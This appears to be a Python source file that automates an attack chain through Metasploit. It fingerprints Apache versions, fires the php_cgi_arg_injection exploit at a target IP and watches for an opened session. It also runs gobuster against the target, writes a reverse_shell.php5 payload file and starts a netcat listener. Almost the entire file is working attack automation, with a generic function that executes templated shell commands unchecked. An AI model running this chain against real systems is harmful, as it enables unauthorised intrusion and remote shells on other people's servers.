from inspect import Parameter
import os
from numpy import mat
from packaging import version
from subprocess import Popen, PIPE
import re
Default = False

def get_output_data(outputLines, Data, block_Out):
    for para in block_Out:
        try: # if Data doesn't contain para, we give it as None
            Data[para]
        except KeyError:
            Data[para] = None
        if Data[para] == None:
            user_input = input("please find value of \"{para}\" in above output, and enter it:".format(para=para))
            if user_input != '':
                if user_input == 'True' or user_input == 'true':
                    Data[para] = True
                elif user_input == 'False' or user_input == 'false':
                    Data[para] = False
                else:
                    Data[para] = user_input
    print("update data:", Data)
    return Data

def check_output_data(Data, block_Out):
    match = True
    for para in block_Out:
        if para not in Data.keys():
            match = False
        else:
            if Data[para] == None:
                match = False
    return match

class Function():
    def http_version(func_in, Data, args, cmd, block_In, block_Out):
        # - msfconsole
        # - wait for 15s (msfconsole opening)
        # - use auxiliary/scanner/http/http_version
        # - set RHOSTS {IP}
        # - run
        # - (assume get Apache/2.4.6)
        match = check_output_data(Data, block_Out)

        configFile=open('meta.rc','w')
        configFile.write('use auxiliary/scanner/http/http_version\n')
        configFile.write(f"set RHOST {func_in['IP']}\n")
        configFile.write('run\n')
        configFile.write('exit\n')
        configFile.close()
        proc = Popen(['msfconsole', '-r', 'meta.rc'], stdout=PIPE)
        for stdout_line in iter(proc.stdout.readline, b''): 
            # code below just for getting apache version
            outputLine = stdout_line.decode('utf-8').rstrip()
            if "Apache/" in outputLine:
                From = outputLine.find('Apache/')+len('Apache/')
                Data['Apache'] = outputLine[From:From+10].split(' ')[0]
                # print(Data['Apache'])
                # problem 1:This way, however, isn't import condition from block!!!
                if version.parse(Data['Apache']) < version.parse('3.1'):
                    match = True

            print(outputLine)     
            
        return Data, match
            

    def php_cgi_arg_injection(func_in, Data, args, cmd, block_In, block_Out):
        # use exploit/multi/http/php_cgi_arg_injection
        # - set RHOSTS {IP}
        # - run
        match = check_output_data(Data, block_Out)

        configFile=open('meta.rc','w')
        configFile.write('use exploit/multi/http/php_cgi_arg_injection\n')
        configFile.write(f"set RHOST {func_in['IP']}\n")
        configFile.write('run\n')
        configFile.write('exit\n')
        configFile.close()
        proc = Popen(['msfconsole', '-r', 'meta.rc'], stdout=PIPE)
        for stdout_line in iter(proc.stdout.readline, b''): 
            # code below just for getting apache version
            outputLine = stdout_line.decode('utf-8').rstrip()
            if re.search("session [0-9] opend", outputLine)!=None:
                match = True
            print(outputLine)        
        
        return Data, match

    def metasploit(func_in, Data, args, cmd, block_In, block_Out):
        match = check_output_data(Data, block_Out)
        script_name = ""
        for arg in args:
            if ".rc" in arg:
                script_name = arg
                break
        # start with a template script
        templateFile=open("./meta_script_template/" + script_name,'r')
        configFile=open(script_name,'w')
        for line in templateFile:
            subst_line = line
            if '<' in line and '>' in line:
                l = line.find('<')
                r = line.find('>')
                param = line[l+1:r]
                subst_line = line.replace("<" + param + ">",Data[param])
            configFile.write(subst_line + "\n")
        templateFile.close()
        configFile.close()
        # run the script
        proc = Popen(['msfconsole'] + args, stdout=PIPE)

        # grab needed info from script
        for stdout_line in iter(proc.stdout.readline, b''): 
            
            outputLine = stdout_line.decode('utf-8').rstrip()
            
            # code below just for getting apache version
            if "Apache/" in outputLine:
                From = outputLine.find('Apache/')+len('Apache/')
                Data['Apache'] = outputLine[From:From+10].split(' ')[0]
                if version.parse(Data['Apache']) < version.parse('3.1'):
                    match = True
            
            if re.search("session [0-9] opend", outputLine)!=None:
                match = True

            print(outputLine)  

        return Data, match 
        
    def print_something(func_in, Data, args, cmd, block_In, block_Out):
        match = check_output_data(Data, block_Out)
        print("class chain is running~~")
        return Data, match

    def gobuster(func_in, Data, args, cmd, block_In, block_Out):
        match = check_output_data(Data, block_Out)
        proc = Popen(['gobuster', 'dir', '-u', func_in['IP'], '-w', '/usr/share/wordlists/dirb/common.txt'], stdout=PIPE)
        for stdout_line in iter(proc.stdout.readline, b''):
            # code below just for getting apache version
            outputLine = stdout_line.decode('utf-8').rstrip()
            print(outputLine)
            if re.search("/panel", outputLine)!=None:
                match = True
                return Data, match
        # os.system(f"gobuster dir -u {func_in['IP']} -w /usr/share/wordlists/dirb/common.txt")
        return Data, match

    def create_file(func_in, Data, args, cmd, block_In, block_Out):
        match = check_output_data(Data, block_Out)
        try:
            with open('/home/kali/Desktop/reverse_shell.php5', 'w') as f:
                file = args[0]
                for i in range(len(args)):
                    file = file.replace("REPLACE_IT", Data[block_In[i]])
                f.write(file)
        except FileNotFoundError:
            print('Fail to create a file on path:/home/kali/Desktop/')
        
        
        return Data, match

    def netcat(func_in, Data, args, cmd, block_In, block_Out):
        match = check_output_data(Data, block_Out)
        os.system(f"nc {Data['argument']} {func_in['port']}")
        return Data, match

    def get_root(func_in, Data, args, cmd, block_In, block_Out):
        match = check_output_data(Data, block_Out)
        return Data, match

    def magic_function(func_in, Data, args, cmd, block_In, block_Out):
        for input_token in func_in:
            if ("<" + input_token + ">") in cmd:
                new_cmd =  cmd.replace("<" + input_token + ">", Data[input_token])
        print("in magic_function excute:", new_cmd.split(" "))
        proc = Popen(new_cmd.split(" "), stdout=PIPE)
        temp = open('temp.txt', 'w')
        temp.truncate(0)
        for stdout_line in iter(proc.stdout.readline, b''):
            print("{}".format(stdout_line.decode('utf-8')).rstrip()) 
            temp.write("{}".format(stdout_line.decode('utf-8')).rstrip())
        Data = get_output_data(temp, Data, block_Out)
        match = check_output_data(Data, block_Out)
        return Data, match
